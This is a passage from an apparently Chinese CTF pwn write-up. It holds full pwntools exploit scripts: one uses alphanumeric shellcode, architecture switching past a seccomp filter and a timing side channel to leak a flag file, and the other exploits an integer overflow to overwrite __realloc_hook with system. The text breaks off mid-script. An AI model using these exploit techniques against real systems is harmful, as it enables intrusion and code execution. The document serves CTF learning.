<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> idx == <span class="hljs-number">0</span>:<br>       code += <span class="hljs-string">&quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret&quot;</span>.<span class="hljs-built_in">format</span>(idx, ch)<br>   <span class="hljs-keyword">else</span>:<br>       code += <span class="hljs-string">&quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret&quot;</span>.<span class="hljs-built_in">format</span>(idx, ch)<br></code></pre></td></tr></table></figure>

<p>idx为读入的字符偏移，ch是我们猜测的字符，若想等，就进入死循环，否则就退出。</p>
<p>通过时间来判断是否想等。</p>
<p>总结:</p>
<p>自己踩了很多坑，shellcode必须为可显字符，后面绕过了，只能用少量的系统函数，64位架构时，只能使用read, mmap, fstat，我还以为切换架构到32位可以绕过syscall检测，想不到只允许调用open， 其他的read和write都不行，又重新切换到64位来执行read，再采用延时爆破读出来。</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: i0gan</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><span class="hljs-comment">#context.arch = &#x27;amd64&#x27;</span><br><br>elf_path  = <span class="hljs-string">&#x27;./shellcode&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;/glibc/2.23/64/lib/libc.so.6&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br><br><span class="hljs-comment"># remote server ip and port</span><br>host = <span class="hljs-string">&quot;39.105.137.118:50050&quot;</span><br><br><span class="hljs-comment"># if local debug</span><br>LOCAL = <span class="hljs-number">0</span><br>LIBC  = <span class="hljs-number">0</span><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>    <span class="hljs-keyword">if</span>(LOCAL):<br>        gdb.attach(io)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_code</span>():<br>    fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;sc.bin&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<br>    code = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov r15, rbx</span><br><span class="hljs-string">    xor rdx, rdx</span><br><span class="hljs-string">    add dx, 0x1080</span><br><span class="hljs-string">    mov rsi, r15</span><br><span class="hljs-string">    add si, 0x120</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    jmp rsi</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    p = asm(code, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>    fd.write(p)<br>    fd.close()<br>    cmd = <span class="hljs-string">&#x27;~/share/ctf/alpha3/ALPHA3.py x64 ascii mixedcase rbx --input=&quot;./sc.bin&quot;&#x27;</span><br>    p = os.popen(cmd).read()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;shellcode: &#x27;</span> + p)<br>    <span class="hljs-keyword">return</span> p<br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-comment"># ref: https://www.yuque.com/chenguangzhongdeyimoxiao/xx6p74/tqpsqr</span><br><span class="hljs-comment"># ref: https://blog.csdn.net/SmalOSnail/article/details/105236336</span><br><span class="hljs-comment"># ref: http://blog.leanote.com/post/xp0int/%5BPwn%5D-Steak-cpt.shao</span><br><span class="hljs-comment"># ref: https://zhuanlan.zhihu.com/p/57648345</span><br><span class="hljs-comment">#  ~/share/ctf/alpha3/ALPHA3.py x64 ascii mixedcase rbx --input=&quot;sc.bin&quot; &gt; o</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">idx, ch</span>):<br>    li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    git clone https://github.com/TaQini/alpha3.git</span><br><span class="hljs-string">    cd alpha3</span><br><span class="hljs-string">    python ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;sc.bin&quot;</span><br><span class="hljs-string">    rax: shellcode base_address</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-comment"># python ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;sc.bin&quot;</span><br>    <span class="hljs-comment">#p = gen_code()</span><br>    p = <span class="hljs-string">&#x27;Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M144x8k1L0I3z2m4p4N4p0Y1O3c8L2k4u4v2t0O1L0A400V044p3E0c&#x27;</span><br>    s(p)<br><br>    code = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    /*mmap*/</span><br><span class="hljs-string">    mov r9d, 0          /* off */</span><br><span class="hljs-string">    mov r8d, 0xFFFFFFFF /* fd */ </span><br><span class="hljs-string">    mov r10d, 0x22 /* flags */</span><br><span class="hljs-string">    mov edx, 7          /* prot */</span><br><span class="hljs-string">    mov esi, 0x1000      /* len */</span><br><span class="hljs-string">    mov edi, 0x20000          /* addr */</span><br><span class="hljs-string">    mov eax, 9</span><br><span class="hljs-string">    syscall </span><br><span class="hljs-string"></span><br><span class="hljs-string">    /*read 32 shellcode*/</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    mov edi, 0</span><br><span class="hljs-string">    mov esi, 0x20000</span><br><span class="hljs-string">    mov edx, 0x1000 </span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /*retf to 32*/</span><br><span class="hljs-string">    mov rax, 0x2300020000</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    p = asm(code, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>    p += <span class="hljs-string">b&#x27;\xCB&#x27;</span> <span class="hljs-comment"># retf</span><br><br>    <span class="hljs-comment">#p += p32(0x400000) + p32(0x23) # ret addr + 0x23:32bit sign</span><br>    sleep(<span class="hljs-number">0.01</span>)<br>    s(p)<br><br>    code = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov esp, 0x20a00</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /*open*/</span><br><span class="hljs-string">    mov eax, 5 </span><br><span class="hljs-string">    mov ebx, 0x20020</span><br><span class="hljs-string">    xor ecx, ecx</span><br><span class="hljs-string">    xor edx, edx</span><br><span class="hljs-string">    int 0x80</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /*retf to 64*/</span><br><span class="hljs-string">    push 0x33</span><br><span class="hljs-string">    push 0x20030</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br>    db()<br>    p = asm(code, arch = <span class="hljs-string">&#x27;i386&#x27;</span>)<br>    p += <span class="hljs-string">b&#x27;\xCB&#x27;</span> <span class="hljs-comment"># retf</span><br>    p = p.ljust(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;\x90&#x27;</span>)<br>    p += <span class="hljs-string">b&#x27;./flag\x00&#x27;</span><br>    p = p.ljust(<span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;\x90&#x27;</span>)<br><br>    code = <span class="hljs-string">&#x27;&#x27;&#x27; </span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    mov edi, 3</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    mov edx, 0x100</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br>    <span class="hljs-keyword">if</span> idx == <span class="hljs-number">0</span>:<br>        code += <span class="hljs-string">&quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret&quot;</span>.<span class="hljs-built_in">format</span>(idx, ch)<br>    <span class="hljs-keyword">else</span>:<br>        code += <span class="hljs-string">&quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret&quot;</span>.<span class="hljs-built_in">format</span>(idx, ch)<br><br>    p += asm(code, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>    sleep(<span class="hljs-number">0.01</span>)<br>    s(p)<br><br>    start = time.time()<br>    <span class="hljs-keyword">try</span>:<br>        io.recv(timeout = <span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    end = time.time()<br><br>    <span class="hljs-keyword">if</span> (end - start &gt; <span class="hljs-number">1.5</span>):<br>        <span class="hljs-keyword">return</span> ch<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>    ia()<br>    c()<br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    idx = <span class="hljs-number">3</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x20</span>, <span class="hljs-number">127</span>):<br>            <span class="hljs-keyword">if</span> LOCAL:<br>                elf = ELF(elf_path)<br>                <span class="hljs-keyword">if</span> LIBC:<br>                    libc = ELF(libc_path)<br>                io = elf.process()<br>            <span class="hljs-keyword">else</span>:<br>                elf = ELF(elf_path)<br>                io = remote(host.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">0</span>], <span class="hljs-built_in">int</span>(host.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">1</span>]))<br>                <span class="hljs-keyword">if</span> LIBC:<br>                    libc = ELF(libc_path)<br><br>            ret = exploit(idx, ch)<br>            <span class="hljs-keyword">if</span>(ret != <span class="hljs-literal">None</span>):<br>                li(<span class="hljs-string">&#x27;found: &#x27;</span> + <span class="hljs-built_in">chr</span>(ch))<br>                flag += <span class="hljs-built_in">chr</span>(ch)<br>                li(<span class="hljs-string">&#x27;flag: &#x27;</span> + flag)<br>                idx += <span class="hljs-number">1</span><br>            io.close()<br><br></code></pre></td></tr></table></figure>





<h2 id="pipeline"><a href="#pipeline" class="headerlink" title="pipeline"></a>pipeline</h2><p>没有free函数，通过设置大小为0即可实现释放内存功能。</p>
<p>找了偏移，chunk头部链表逻辑，没有发现漏洞，在编辑数据的功能中，发现了个整型溢出漏洞。</p>
<p>漏洞点</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c">_QWORD *<span class="hljs-title function_">edit_body</span><span class="hljs-params">()</span><br>&#123;<br>  _QWORD *result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> index; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  _QWORD *buf; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  index = print(<span class="hljs-string">&quot;index: &quot;</span>);<br>  result = (_QWORD *)get_buf(index);<br>  buf = result;<br>  <span class="hljs-keyword">if</span> ( result )<br>  &#123;<br>    result = (_QWORD *)*result;<br>    <span class="hljs-keyword">if</span> ( *buf )<br>    &#123;<br>      v3 = print(<span class="hljs-string">&quot;size: &quot;</span>);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data: &quot;</span>);<br>      size = *((_DWORD *)buf + <span class="hljs-number">3</span>) - *((_DWORD *)buf + <span class="hljs-number">2</span>);<span class="hljs-comment">// size - offset</span><br>      <span class="hljs-keyword">if</span> ( v3 &lt;= size )<br>        LOWORD(size) = v3;                      <span class="hljs-comment">// vul</span><br>      result = (_QWORD *)readn(*buf + *((<span class="hljs-type">int</span> *)buf + <span class="hljs-number">2</span>), size);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>一个整性溢出，因为采用<code>LOWORD(size) = v3; </code>进行赋值的，当我输入负数绕过判断，若LOWORD(v3)中的值为大于size本身值，即可实现溢出，那么就很好利用了。实现了任意地址写入，但有个检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">check_error</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> __int64 ptr)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 result; <span class="hljs-comment">// rax</span><br><br>  <span class="hljs-keyword">if</span> ( ptr &lt; *(_QWORD *)check_mem_buf<br>    || (result = *(_QWORD *)check_mem_buf + *(_QWORD *)(check_mem_buf + <span class="hljs-number">8</span>), ptr &gt;= result) )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>而check_mem_buf的值在初始化的时候赋予了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">init_</span><span class="hljs-params">()</span><br>&#123;<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  check_mem_buf = (__int64)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>uLL);<br>  *(_QWORD *)check_mem_buf = check_mem_buf + <span class="hljs-number">16</span>;<br>  *(_QWORD *)(check_mem_buf + <span class="hljs-number">8</span>) = <span class="hljs-number">0x21000</span>LL;   <span class="hljs-comment">// memsize</span><br>  <span class="hljs-keyword">return</span> alarm(<span class="hljs-number">0x78</span>u);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>基本上我们只能在堆段中实现任意地址写入了，这也比较好绕过，每个编辑功能都有个head chunk，修改head中的body指针，就可以实现任意地址写入数据了。</p>
<p>修改<code>__realloc_hook</code>为system，再调用realloc函数即可调用system。</p>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: i0gan</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><span class="hljs-comment">#context.arch = &#x27;amd64&#x27;</span><br><br>elf_path  = <span class="hljs-string">&#x27;pipeline&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;/glibc/2.23/64/lib/libc.so.6&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br><span class="hljs-comment">#libc_path = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><br><span class="hljs-comment"># remote server ip and port</span><br>host = <span class="hljs-string">&quot;59.110.173.239:2399&quot;</span><br><br><span class="hljs-comment"># if local debug</span><br>LOCAL = <span class="hljs-number">0</span><br>LIBC  = <span class="hljs-number">1</span><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>    <span class="hljs-keyword">if</span>(LOCAL):<br>        gdb.attach(io)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>():<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md</span>(<span class="hljs-params">idx, of, sz</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(of))<br>    sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(sz))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rm</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ap</span>(<span class="hljs-params">idx, sz, d</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(sz))<br>    sa(<span class="hljs-string">&#x27;:&#x27;</span>, d)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dp</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>    <span class="hljs-comment"># leak libc</span><br>    ad()<br>    md(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x458</span>)<br><br>    ad()<br>    md(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-comment"># free</span><br><br>    md(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x458</span>) <span class="hljs-comment"># 